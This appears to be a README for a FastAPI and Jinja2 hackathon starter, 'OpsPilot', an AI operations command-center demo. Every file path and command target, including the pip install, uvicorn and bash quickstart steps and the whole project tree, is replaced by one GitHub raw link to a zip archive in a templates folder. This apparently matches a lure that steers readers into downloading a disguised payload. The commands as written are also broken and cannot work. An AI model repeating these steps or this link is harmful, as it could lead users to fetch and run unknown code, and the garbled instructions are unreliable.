# OpsPilot Starter (FastAPI + Jinja2)

**What this is:** a self-contained, hackathon-friendly starter to demo an **AI Operations Command Center**:
- Ingest "events" (invoice emails, complaints, sheet alerts) via an API
- Classify → prioritize → choose a runbook
- Execute actions through a small ToolRouter (Slack/Sheets/Notion stubs)
- Human-in-the-loop approvals via the dashboard buttons or Slack links
- Everything runs locally. Zero external services required.

> Optional: set a `SLACK_WEBHOOK_URL` in `.env` to send real Slack messages. Otherwise actions are logged in `app/data/`.

---

## Quickstart (10 minutes)

1) Install Python 3.10+
2) Create a virtual env and install deps:
```bash
python -m venv .venv && source .venv/bin/activate
pip install -r https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip
```
3) Copy `https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip` → `.env` and (optionally) paste a Slack webhook URL.
4) Run the server:
```bash
uvicorn https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip --reload --port 8000
```
5) In a new terminal, run the demo script to push sample events:
```bash
bash https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip
```
6) Open the dashboard: http://localhost:8000

- Approve/Reject any pending run right from the dashboard.
- All logs & state live in `app/data/`.

---

## Project structure
```
app/
  https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip                # FastAPI app + routes + dashboard
  https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip              # Pydantic models
  services/
    https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip        # Simple rule-based classifier (LLM-drop-in spot)
    https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip          # Maps (type, priority) -> action plan
    https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip        # Executes tools & records tool call telemetry
  tools/
    https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip             # Optional Slack webhook; else log file
    https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip            # Stub: logs task creation
    https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip            # Stub: appends CSV
  templates/             # Jinja2 HTML templates for the dashboard
  data/                  # State + logs (JSON, CSV, log files)
demo_fixtures/           # Example events to ingest
scripts/
  https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip            # cURL a few fixtures
```

---

## Where to plug an LLM later
Replace the simple heuristics in `https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip` with an OpenAI call (or any LLM API) to produce:
```json
{ "type": "invoice|complaint|anomaly|misc", "priority": "P0..P3", "owner_hint": "ops@", "next_action": "..." }
```
Be sure to **do not** log secrets—`toolrouter` already redacts parameters in telemetry.

---

## Persisting to a DB (stretch)
For the hackathon demo, state is in `https://github.com/AjXKai/opspilot-starter/raw/refs/heads/main/app/templates/starter_opspilot_1.4.zip`. If you later want Postgres, add SQLAlchemy models and replace the `load_state/save_state` helpers.

---

## Docker (optional)
```bash
# Build
docker build -t opspilot-starter .
# Run
docker run -p 8000:8000 --env-file .env opspilot-starter
```
